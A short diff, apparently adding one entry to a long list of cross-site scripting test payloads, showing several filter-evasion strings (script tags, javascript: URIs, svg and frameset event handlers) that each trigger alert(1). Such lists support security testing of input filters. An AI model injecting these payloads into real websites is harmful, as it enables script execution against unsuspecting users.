@@ -2198,3 +2198,4 @@ http://www.<script>alert(1)</script .com
 location='javascript://\u2028alert(1)';
 <svg onresize="alert(1)">
 <applet/object onerror=alert('XSS')> 
+<frameset/onpageshow=alert(1)> 
